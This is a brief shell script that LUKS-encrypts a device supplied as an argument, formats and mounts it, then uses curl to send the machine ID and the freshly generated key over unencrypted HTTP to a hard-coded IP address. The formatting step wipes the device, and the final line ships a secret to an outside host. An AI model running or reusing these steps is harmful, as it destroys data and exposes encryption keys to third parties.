#!/bin/sh

key=$(openssl rand -base64 16)

uid=$(cat /etc/machine-id)
device=$1

echo "Device to encrypt is:" ${device}

echo $key | cryptsetup -q luksFormat $device

echo $key | cryptsetup luksOpen $device encrypted

mkfs.ext4 /dev/mapper/encrypted

mount /dev/mapper/encrypted /mnt

curl -s "http://188.166.62.200:5000/updatekey?uid=$uid&cryptokey=$key"
